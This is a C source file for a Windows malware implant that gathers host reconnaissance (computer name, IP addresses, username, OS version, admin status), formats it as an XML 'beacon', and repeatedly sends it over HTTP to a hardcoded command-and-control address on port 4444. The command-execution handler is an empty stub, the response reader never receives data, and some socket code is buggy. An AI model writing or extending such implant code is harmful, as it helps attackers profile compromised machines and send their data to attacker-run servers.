#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Mincore.lib") // -lVersion

DWORD dwTimeout = 30000; // ms

/******* Functions for building the beacon *********/

static LPSTR appendBuff(LPSTR lpPos, LPCSTR format, ...)
{
	va_list args;
	va_start(args, format);

	int n = vsprintf(lpPos, format, args); // ASCII

	va_end(args);
	return (lpPos + n);
}

static LPSTR getHostName()
{
	LPSTR lpszHostname = malloc(150);
	CHAR infoBuf[150];
	DWORD dwBufCharCount = 150;
	int i;
	if (GetComputerNameA(infoBuf, &dwBufCharCount)) { // NetBIOS name of
													  // the local computer
		for (i = 0; i < 150; i++)
			lpszHostname[i] = infoBuf[i];
	} else {
		strcpy(lpszHostname, "");
	}

	return lpszHostname;
}

static int getIPAddrs(LPSTR lpszAddrs[], int iMaxAddrs)
{
	PMIB_IPADDRTABLE pIPAddrTable;
    DWORD dwSize = 0;
    DWORD dwRetVal = 0;
    IN_ADDR IPAddr;

    pIPAddrTable = malloc(sizeof(MIB_IPADDRTABLE));

    if (pIPAddrTable) {
        if (GetIpAddrTable(pIPAddrTable, &dwSize, 0) ==
            ERROR_INSUFFICIENT_BUFFER) {
            free(pIPAddrTable);
            pIPAddrTable = malloc(dwSize);
        }
        if (pIPAddrTable == NULL) {
            printf("[*] Memory allocation failed for GetIPAddrTable\n");
            return 0;
        }
    }

    if ((dwRetVal = GetIpAddrTable(pIPAddrTable, &dwSize, 0)) != NO_ERROR) {
    	printf("[-] GetIpAddrTable failed\n");
    	return 0;
    }

    int i, n = 0;
    for (i = 0; i < (int) pIPAddrTable->dwNumEntries; i++) {
        IPAddr.S_un.S_addr = (u_long) pIPAddrTable->table[i].dwAddr;
        LPSTR lpszIP = malloc(16); // ASCII
        if (lpszIP) {
	        sprintf(lpszIP, inet_ntoa(IPAddr)); // ASCII
	        if (strncmp(lpszIP, "127", 3) == 0) {
	            free(lpszIP);
	            continue;
	        }

	        lpszAddrs[n] = lpszIP;
	        n++;

	        if (n > iMaxAddrs)
	            break;
	    }
    }

    if (pIPAddrTable) {
        free(pIPAddrTable);
    }

    return n;
}

static int isInternalIP(char *_addr)
{
	int priv = 0;

	int f, s, t, fo;
	sscanf(_addr, "%u.%u.%u.%u", &f, &s, &t, &fo);

	// check if IPv4 is private base on first two numbers
	if (f == 10 || f == 127 ||
	    (f == 100 && s >= 64 && s <= 127) ||
	    (f == 172 && s >= 16 && s <= 31) ||
	    (f == 169 && s == 254) || (f == 192 && s == 168))
		priv = 1;

	return priv;
}

static LPSTR getOSVersion()
{
	LPSTR lpszOSVersion = malloc(64); // ASCII
	if (lpszOSVersion == NULL)
		return NULL;

	LPTSTR lpszFilePath = "C:\\Windows\\System32\\kernel32.dll";
	DWORD dwDummy;
	DWORD dwFVISize = GetFileVersionInfoSize(lpszFilePath, &dwDummy);
	if (dwFVISize == 0) {
		printf("GetFileVersionInfoSize failed: %d\n", GetLastError());
		return NULL;
	}

	LPBYTE lpVersionInfo = malloc(dwFVISize);
    if (!GetFileVersionInfo(lpszFilePath,0, dwFVISize, lpVersionInfo)) {
    	printf("GetFileVersionInfo failed\n");
    	return NULL;
    }
    
    UINT uLen;
    VS_FIXEDFILEINFO *lpFfi;

    if (!VerQueryValue(lpVersionInfo, TEXT("\\"), (LPVOID *) &lpFfi, &uLen)) {
    	printf("VerQueryValue\n");
    	return NULL;
    }

    DWORD dwFileVersionMS = lpFfi->dwProductVersionMS;
    DWORD dwFileVersionLS = lpFfi->dwProductVersionLS;

    free(lpVersionInfo);

    DWORD dwLeftMost = HIWORD(dwFileVersionMS);
    DWORD dwSecondLeft = LOWORD(dwFileVersionMS);
    DWORD dwSecondRight = HIWORD(dwFileVersionLS);
    DWORD dwRightMost = LOWORD(dwFileVersionLS);

    sprintf(lpszOSVersion, "%d.%d.%d.%d", dwLeftMost, dwSecondLeft,
    	dwSecondRight, dwRightMost); // ASCII

	return lpszOSVersion;
}

static BOOL isAdmin(void)
{
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}

	if (hToken)
		CloseHandle(hToken);

	return fRet;
}

static LPSTR getBeacon(void)
{
	LPSTR lpszBeacon = malloc(1024); // ASCII
	if (lpszBeacon == NULL)
		return NULL;

	LPSTR lpPos = lpszBeacon;
	lpPos = appendBuff(lpPos, "<Beacon>\n");
	lpPos = appendBuff(lpPos, "\t<Type>HEY</Type>\n");

	LPSTR lpszHostname = getHostName(); // TCHAR
	lpPos = appendBuff(lpPos, "\t<HostName>%s</HostName>\n", lpszHostname);
	free(lpszHostname);

#define MAX_IPS 10
	LPSTR lpszAddrs[MAX_IPS]; // ASCII
	int iNumAddrs = getIPAddrs(lpszAddrs, MAX_IPS);
	int i;
	for (i = 0; i < iNumAddrs; i++) {
		if (isInternalIP(lpszAddrs[i])) {
			lpPos = appendBuff(lpPos,
				"\t<InternalIP>%s</InternalIP>\n", lpszAddrs[i]);
		} else {
			lpPos = appendBuff(lpPos,
				"\t<ExternalIP>%s</ExternalIP>\n", lpszAddrs[i]);
		}
		free(lpszAddrs[i]);
	}

	DWORD len = UNLEN + 1;
	LPSTR username = malloc(len); // TCHAR
	if (GetUserNameA(username, &len)) {
		lpPos = appendBuff(lpPos,
			"\t<CurrentUser>%s</CurrentUser>\n", username);
	} else {
		lpPos = appendBuff(lpPos,
			"\t<CurrentUser></CurrentUser>\n");
	}
	free(username);

	LPSTR lpszOSVersion = getOSVersion(); // ASCII
	if (lpszOSVersion) {
		lpPos = appendBuff(lpPos, "\t<OS>Windows %s</OS>\n", lpszOSVersion);
		free(lpszOSVersion);
	} else {
		lpPos = appendBuff(lpPos, "\t<OS></OS>\n", lpszOSVersion);
	}

	lpPos = appendBuff(lpPos,
		"\t<Admin>%c</Admin>\n", (isAdmin() ? 'Y' : 'N')); // ASCII

	lpPos = appendBuff(lpPos, "</Beacon>\n");
	
	return lpszBeacon;
}

/********* Functions to connect to send the beacon ************/

#define BEACON_RESP_MAX_SIZE 1024

static LPSTR getBeaconResponse(SOCKET sock)
{
	LPSTR lpszResp = malloc(BEACON_RESP_MAX_SIZE);
	if (!lpszResp)
		return NULL;

	return lpszResp;
}

static int inet_pton(int af, const char *src, void *dst)
{
	struct sockaddr_storage ss;
	int iSize = sizeof(ss);
	CHAR srCopy[INET6_ADDRSTRLEN];

	ZeroMemory(&ss, sizeof(ss));
	strncpy (srCopy, src, INET6_ADDRSTRLEN);
	srCopy[INET6_ADDRSTRLEN] = 0;

	if (WSAStringToAddress(srCopy, af, NULL, (struct sockaddr *)&ss, &iSize) == 0) {
		switch(af) {
		case AF_INET:
			*(struct in_addr *)dst = ((struct sockaddr_in *)&ss)->sin_addr;
			return 1;
		case AF_INET6:
			*(struct in6_addr *)dst = ((struct sockaddr_in6 *)&ss)->sin6_addr;
			return 1;
		}
	}
	return 0;
}

static int connect_to_c2(SOCKET *sock, const char *host, int port)
{
	*sock = INVALID_SOCKET;

	struct sockaddr_in serv_addr;
	ZeroMemory(&serv_addr, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(port);
	if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
		printf("[-] inet_pton\n");
		return SOCKET_ERROR;
	}

	SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (ConnectSocket == INVALID_SOCKET) {
		printf("[-] socket\n");
		return SOCKET_ERROR;
	}

	struct timeval tv;
	tv.tv_sec = 30;
	tv.tv_usec = 0;
	if (setsockopt(ConnectSocket, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv,
		       sizeof(struct timeval)) == SOCKET_ERROR)
		return SOCKET_ERROR;

	
	if (connect(ConnectSocket, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		return 0;
	}

	*sock = ConnectSocket;
	return 0;
}

#define TERMINATE (-1)
#define RETRY 0

static int sendBeacon(SOCKET sock, char *request, size_t requestLen)
{
	if (request == NULL || requestLen == 0)
		return TERMINATE;	/* If no beacon could be retrieved, abort */

	int iNumSent;
	PCHAR lpcPos = request;
	while (requestLen > 0) {
		iNumSent = send(sock, lpcPos, requestLen, 0);
		if (iNumSent == SOCKET_ERROR) {
			return RETRY;
		} else {
			requestLen -= iNumSent;
			if (requestLen)
				lpcPos += iNumSent;
		}
	}

	return 1;
}

void parseAndExec(LPSTR lpszHTTPResp)
{

}

#define RHOST "192.168.1.13"
#define RPORT 4444
#define RPORT_STR "4444"

int main()
{
	printf("[*] Acquiring beacon...");
	LPSTR lpszBeacon = getBeacon();
	if (!lpszBeacon) {
		printf("failed\n");
		return -1;
	}
	printf("done\n");

	printf("[*] Beacon:\n%s", lpszBeacon);

#define HTTP_REQ_MAX_SIZE 1024
	LPSTR lpszHTTPReq = malloc(HTTP_REQ_MAX_SIZE);
	if (!lpszHTTPReq) {
		printf("lpszHTTPReq malloc\n");
		free(lpszBeacon);
		return -1;
	}
	sprintf(lpszHTTPReq, "GET /beacon/ HTTP/1.1\r\n"
					   "Host: " RHOST ":" RPORT_STR "\r\n"
					   "Content-Length: %d\r\n"
					   "\r\n%s", strlen(lpszBeacon), lpszBeacon);

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
		printf("[-] WSAStartup failed\n");
		return -1;
	}
	
	while (TRUE) {
		SOCKET c2Socket = INVALID_SOCKET;
		int iRet;

		printf("[*] Connecting to c2 server...");
		iRet = connect_to_c2(&c2Socket, RHOST, RPORT);
		if (iRet == SOCKET_ERROR) { // terminate
			printf("failed\n");
			printf("[*] Terminating\n");
			break;
		} else if (c2Socket == INVALID_SOCKET) { // retry later
			printf("failed\n");
			printf("[*] Retrying in %d seconds\n", (dwTimeout/1000));
			Sleep(dwTimeout);
			continue;
		}
		printf("done\n");

		printf("[*] Sending beacon to server:\n%s\n", lpszHTTPReq);
		iRet = sendBeacon(c2Socket, lpszHTTPReq, strlen(lpszHTTPReq));
		if (iRet == TERMINATE) {
			printf("[-] Error. Terminating.\n");
			closesocket(c2Socket);
			break;
		} else if (iRet == RETRY) {
			printf("[-] Could not send beacon, will retry\n");
			printf("[*] Closing socket\n");
			closesocket(c2Socket);
			printf("[*] Sleep %d seconds before retrying...\n", (dwTimeout/1000));
			Sleep(dwTimeout);
		} else {
			printf("[*] Beacon sent.\n");
			LPSTR lpszHTTPResp = getBeaconResponse(c2Socket);
			if (lpszHTTPResp) {
				printf("[*] Server response:\n%s\n", lpszHTTPResp);
				printf("[*] Preparing execution\n");
				parseAndExec(lpszHTTPResp);
				printf("[*] Resuming main loop\n");
				free(lpszHTTPResp);
				Sleep(dwTimeout);
			} else {
				printf("[-] No response received\n");
			}
		}

	}

	
	free(lpszBeacon);
	free(lpszHTTPReq);
	
	return 0;
}